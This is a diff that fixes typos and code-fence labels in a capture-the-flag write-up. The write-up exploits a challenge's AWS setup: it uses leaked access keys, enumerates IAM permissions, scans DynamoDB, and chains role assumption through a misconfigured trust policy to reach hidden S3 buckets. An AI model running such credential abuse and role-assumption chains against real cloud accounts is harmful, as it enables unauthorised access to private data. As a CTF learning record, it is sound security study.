@@ -78,7 +78,7 @@ def customers():
 app.run('0.0.0.0',9000)
 ```
 
-Two things can be seen in the sourc code which look interesting
+Two things can be seen in the source code which look interesting
 
 The access key and the secret key for AWS which is used for accessing the dynamodb
 
@@ -97,8 +97,8 @@ aws configure --profile <profile name>
 Or we can just change the `~/.aws/credentials` file directly
 
 We can access the data on the database using those keys : 
-```json
-aws --profile=tetctf dynamodb scan --table-name customers
+```
+aws --profile tetctf dynamodb scan --table-name customers
 {
     "Items": [
         {
@@ -166,7 +166,7 @@ python3 enumerate-iam.py --access-key AKIAXNIS54OCBQD5C4ME --secret-key 1DQnIi0M
 
 I found that we can list out the roles : 
 
-```json
+```
 aws iam list-roles --profile tetctf
 {
     "Roles": [
@@ -321,7 +321,7 @@ Luckily, the admin lend me the key of an AWS account, so I can continue this cha
 
 Then I created a role on that account that match that condition : 
 
-```json
+```
 aws iam create-role --role-name kaiziron-Accessing_Tet_CTF_Flag1 --assume-role-policy-document file://policy.json
 {
     "Role": {
@@ -347,7 +347,7 @@ aws iam create-role --role-name kaiziron-Accessing_Tet_CTF_Flag1 --assume-role-p
 ```
 
 For the policy document, I just googled for some example and modified a bit so that I can assume it : 
-```json
+```
 {
   "Version": "2012-10-17",
   "Statement": [
@@ -361,7 +361,7 @@ For the policy document, I just googled for some example and modified a bit so t
 ```
 
 Then I just assume that role I just created : 
-```json
+```
 aws sts assume-role --role-arn 'arn:aws:iam::509530203012:role/kaiziron-Accessing_Tet_CTF_Flag1' --role-session-name kaiziron-Accessing_Tet_CTF_Flag1
 {
     "Credentials": {
@@ -381,7 +381,7 @@ Then I just create another profile using the access key, secret key and the sess
 
 Using that role which match the condition, we can assume the CTF_ROLE because of its misconfiguration : 
 
-```json
+```
 aws sts assume-role --role-arn 'arn:aws:iam::509530203012:role/CTF_ROLE' --role-session-name kaiziron-Accessing_Tet_CTF_Flag1 --profile tetctf2
 {
     "Credentials": {
@@ -421,7 +421,7 @@ aws --profile ctf_role s3 ls
 2021-12-29 22:48:31 tet-ctf-secret
 ```
 
-`secret-tetctf` is the bucket that contains the python script and the image, and `tet-ctf-secret` is a newly discover bucket.
+`secret-tetctf` is the bucket that contains the python script and the image, and `tet-ctf-secret` is a newly discovered bucket.
 
 I tried to use this URL to access it, however access denied : 
 
